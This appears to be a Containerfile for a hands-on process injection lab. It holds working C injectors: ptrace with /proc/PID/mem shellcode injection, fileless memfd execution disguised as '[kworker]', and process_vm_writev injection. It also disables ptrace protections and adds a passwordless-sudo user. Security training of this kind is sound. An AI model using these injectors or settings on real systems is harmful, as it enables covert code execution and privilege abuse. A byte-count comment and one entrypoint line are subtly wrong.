# process-injection.Containerfile
# Container with a target process and injection tools for hands-on practice.
#
# Build:
#   podman build -t injection-lab -f process-injection.Containerfile .
#
# Run (with ptrace allowed):
#   podman run -d --name inject-lab --cap-add=SYS_PTRACE \
#       --security-opt seccomp=unconfined injection-lab
#
# Or run privileged for the full environment:
#   podman run -d --name inject-lab --privileged injection-lab
#
# Access:
#   podman exec -it inject-lab bash

FROM archlinux:latest

RUN pacman -Syu --noconfirm && \
    pacman -S --noconfirm \
        gcc \
        gdb \
        vim \
        python \
        strace \
        net-tools \
        binutils \
        base-devel \
        procps-ng \
        sudo \
        lsof \
        xxd \
        grep \
        sed && \
    pacman -Scc --noconfirm

# Disable Yama ptrace restrictions for the lab environment
RUN echo 'kernel.yama.ptrace_scope = 0' > /etc/sysctl.d/99-injection-lab.conf

# Create lab user with sudo
RUN useradd -m -s /bin/bash student && \
    echo 'student:changeme' | chpasswd && \
    echo 'student ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers

# Simple target process: loops forever, prints PID and counter
RUN printf '#include <stdio.h>\n' \
    '#include <unistd.h>\n' \
    '#include <signal.h>\n' \
    '#include <string.h>\n' \
    '\n' \
    'volatile sig_atomic_t keep_running = 1;\n' \
    '\n' \
    'void handle_sigint(int sig) { keep_running = 0; }\n' \
    '\n' \
    'void do_work(void) {\n' \
    '    char buf[256];\n' \
    '    snprintf(buf, sizeof(buf), "processing batch %%d", 42);\n' \
    '    usleep(100000);\n' \
    '}\n' \
    '\n' \
    'int main(void) {\n' \
    '    int counter = 0;\n' \
    '    signal(SIGINT, handle_sigint);\n' \
    '    printf("[PID %%d] Target process started. Press Ctrl+C to stop.\\n", getpid());\n' \
    '    printf("[PID %%d] Inject me with shellcode!\\n", getpid());\n' \
    '    while (keep_running) {\n' \
    '        printf("[PID %%d] Iteration %%d\\n", getpid(), counter++);\n' \
    '        do_work();\n' \
    '        sleep(3);\n' \
    '    }\n' \
    '    printf("[PID %%d] Exiting cleanly.\\n", getpid());\n' \
    '    return 0;\n' \
    '}\n' \
    > /opt/target.c && \
    gcc -o /opt/target /opt/target.c

# Lab directory structure
RUN mkdir -p /opt/injection-lab/injectors

# Injector 1: /proc/PID/mem injection via ptrace
COPY <<'INJECTOR1' /opt/injection-lab/injectors/proc_mem_inject.c
/*
 * proc_mem_inject.c — Inject shellcode via /proc/PID/mem with ptrace
 * Compile: gcc -o proc_mem_inject proc_mem_inject.c
 * Usage:   sudo ./proc_mem_inject <target_pid>
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/types.h>
#include <errno.h>

/* execve("/bin/sh", NULL, NULL) x86_64 shellcode — 27 bytes */
unsigned char shellcode[] =
    "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e"
    "\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89"
    "\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";
size_t shellcode_len = sizeof(shellcode) - 1;

void find_writable_executable(pid_t pid,
    unsigned long *addr, unsigned long *end)
{
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    FILE *fp = fopen(path, "r");
    if (!fp) { perror("fopen maps"); exit(1); }
    char line[512];
    while (fgets(line, sizeof(line), fp)) {
        unsigned long start, end_addr;
        char perm[8];
        if (sscanf(line, "%lx-%lx %4s", &start, &end_addr, perm) == 3) {
            if (perm[1] == 'w' && perm[2] == 'x') {
                *addr = start;
                *end = end_addr;
                fclose(fp);
                return;
            }
        }
    }
    /* Fallback: look for stack */
    rewind(fp);
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "[stack]")) {
            unsigned long start, end_addr;
            sscanf(line, "%lx-%lx", &start, &end_addr);
            *addr = start;
            *end = end_addr;
            fclose(fp);
            return;
        }
    }
    fclose(fp);
    fprintf(stderr, "[-] No writable-executable region found\n");
    exit(1);
}

int main(int argc, char **argv)
{
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <target_pid>\n", argv[0]);
        return 1;
    }
    pid_t target = atoi(argv[1]);
    printf("[*] Target: PID %d\n", target);

    /* Attach */
    if (ptrace(PTRACE_ATTACH, target, NULL, NULL) < 0) {
        perror("PTRACE_ATTACH");
        return 1;
    }
    int status;
    waitpid(target, &status, 0);
    printf("[+] Attached\n");

    /* Save registers */
    struct user_regs_struct orig_regs;
    ptrace(PTRACE_GETREGS, target, NULL, &orig_regs);
    printf("[+] Original RIP: 0x%llx\n", orig_regs.rip);

    /* Find injection target */
    unsigned long inj_addr, inj_end;
    find_writable_executable(target, &inj_addr, &inj_end);
    printf("[+] Injecting at 0x%lx - 0x%lx\n", inj_addr, inj_end);

    /* Open /proc/PID/mem */
    char mem_path[256];
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", target);
    int mem_fd = open(mem_path, O_RDWR);
    if (mem_fd < 0) { perror("open mem"); return 1; }

    /* Write shellcode */
    if (lseek(mem_fd, inj_addr, SEEK_SET) < 0) {
        perror("lseek"); close(mem_fd); return 1;
    }
    ssize_t written = write(mem_fd, shellcode, shellcode_len);
    printf("[+] Wrote %zd bytes\n", written);
    close(mem_fd);

    /* Redirect RIP */
    struct user_regs_struct new_regs = orig_regs;
    new_regs.rip = inj_addr;
    ptrace(PTRACE_SETREGS, target, NULL, &new_regs);
    printf("[+] RIP -> 0x%lx\n", inj_addr);

    /* Continue */
    ptrace(PTRACE_CONT, target, NULL, NULL);
    waitpid(target, &status, 0);
    printf("[*] Target exited\n");
    return 0;
}
INJECTOR1

# Injector 2: fileless execution via memfd_create
COPY <<'INJECTOR2' /opt/injection-lab/injectors/memfd_exec.c
/*
 * memfd_exec.c — Fileless ELF execution
 * Compile: gcc -o memfd_exec memfd_exec.c
 * Usage:   ./memfd_exec /bin/id
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>

int main(int argc, char **argv)
{
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <elf_binary>\n", argv[0]);
        return 1;
    }
    int fd = open(argv[1], O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    struct stat st;
    fstat(fd, &st);
    size_t size = st.st_size;

    unsigned char *data = mmap(NULL, size, PROT_READ,
        MAP_PRIVATE, fd, 0);
    close(fd);

    if (data == MAP_FAILED) { perror("mmap"); return 1; }

    int mem_fd = syscall(SYS_memfd_create, "[kworker]", MFD_CLOEXEC);
    if (mem_fd < 0) {
        perror("memfd_create");
        munmap(data, size);
        return 1;
    }

    if (write(mem_fd, data, size) != (ssize_t)size) {
        perror("write");
        close(mem_fd);
        munmap(data, size);
        return 1;
    }
    munmap(data, size);

    fexecve(mem_fd, &argv[1], NULL);
    perror("fexecve");
    close(mem_fd);
    return 1;
}
INJECTOR2

# Injector 3: process_vm_writev (no ptrace needed)
COPY <<'INJECTOR3' /opt/injection-lab/injectors/pvm_inject.c
/*
 * pvm_inject.c — process_vm_writev injection (bypasses Yama)
 * Compile: gcc -o pvm_inject pvm_inject.c
 * Usage:   ./pvm_inject <target_pid> <remote_address>
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/uio.h>
#include <sys/types.h>

unsigned char shellcode[] =
    "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e"
    "\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89"
    "\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";
size_t shellcode_len = sizeof(shellcode) - 1;

int main(int argc, char **argv)
{
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <pid> <remote_address>\n", argv[0]);
        fprintf(stderr, "Get address from /proc/PID/maps (look for [stack])\n");
        return 1;
    }
    pid_t target = atoi(argv[1]);
    unsigned long remote_addr = strtoul(argv[2], NULL, 16);

    struct iovec local_iov = { .iov_base = shellcode, .iov_len = shellcode_len };
    struct iovec remote_iov = { .iov_base = (void *)remote_addr, .iov_len = shellcode_len };

    ssize_t written = process_vm_writev(target, &local_iov, 1, &remote_iov, 1, 0);
    if (written < 0) {
        perror("process_vm_writev");
        return 1;
    }
    printf("[+] Wrote %zd bytes to PID %d at 0x%lx\n", written, target, remote_addr);
    printf("[!] Still need to trigger execution (PTRACE_SETREGS or GOT overwrite)\n");
    return 0;
}
INJECTOR3

# Compile all injectors
RUN gcc -o /opt/injection-lab/injectors/proc_mem_inject /opt/injection-lab/injectors/proc_mem_inject.c && \
    gcc -o /opt/injection-lab/injectors/memfd_exec /opt/injection-lab/injectors/memfd_exec.c && \
    gcc -o /opt/injection-lab/injectors/pvm_inject /opt/injection-lab/injectors/pvm_inject.c

# Exercise script: start target, run injector
COPY <<'RUNLAB' /opt/injection-lab/run-lab.sh
#!/bin/bash
echo "=== Process Injection Lab ==="
echo ""
echo "Starting target process..."
/opt/target &
TARGET_PID=$!
echo "Target PID: $TARGET_PID"
sleep 1

echo ""
echo "Target process memory layout:"
cat /proc/$TARGET_PID/maps | grep -E 'stack|heap|rwx'

echo ""
echo "Available injectors:"
echo "  1. /opt/injection-lab/injectors/proc_mem_inject $TARGET_PID"
echo "  2. /opt/injection-lab/injectors/pvm_inject $TARGET_PID <stack_addr>"
echo "  3. /opt/injection-lab/injectors/memfd_exec /bin/id"
echo ""
echo "To test ptrace injection:"
echo "  sudo /opt/injection-lab/injectors/proc_mem_inject $TARGET_PID"
echo ""
echo "To test with GDB:"
echo "  sudo gdb -p $TARGET_PID"
echo ""
echo "Monitoring target:"
tail -f /proc/$TARGET_PID/fd/1 2>/dev/null || wait $TARGET_PID
RUNLAB

RUN chmod 755 /opt/injection-lab/run-lab.sh

# Create helper to check ptrace_scope
RUN printf '#!/bin/bash\n' \
    'echo "ptrace_scope: $(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null || echo "Yama not enabled")"\n' \
    'echo "Expected: 0 (permissive)"\n' \
    > /opt/injection-lab/check-ptrace.sh && \
    chmod 755 /opt/injection-lab/check-ptrace.sh

# Entrypoint script that applies sysctl and starts the lab
RUN printf '#!/bin/bash\n' \
    'echo "[*] Process Injection Lab"\n' \
    'sysctl -w kernel.yama.ptrace_scope=0 2>/dev/null || true\n' \
    'echo "[*] ptrace_scope=$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null || echo N/A)"\n' \
    'echo "[*] Starting target process..."\n' \
    '/opt/target &' \
    'TARGET_PID=$!\n' \
    'echo "[*] Target PID: $TARGET_PID"\n' \
    'echo "[*] Run injectors (sudo required for ptrace):"\n' \
    'echo "    sudo /opt/injection-lab/injectors/proc_mem_inject $TARGET_PID"\n' \
    'echo "[*] Interactive shell:"\n' \
    'exec bash\n' \
    > /usr/local/bin/entrypoint.sh && \
    chmod 755 /usr/local/bin/entrypoint.sh

CMD ["/usr/local/bin/entrypoint.sh"]
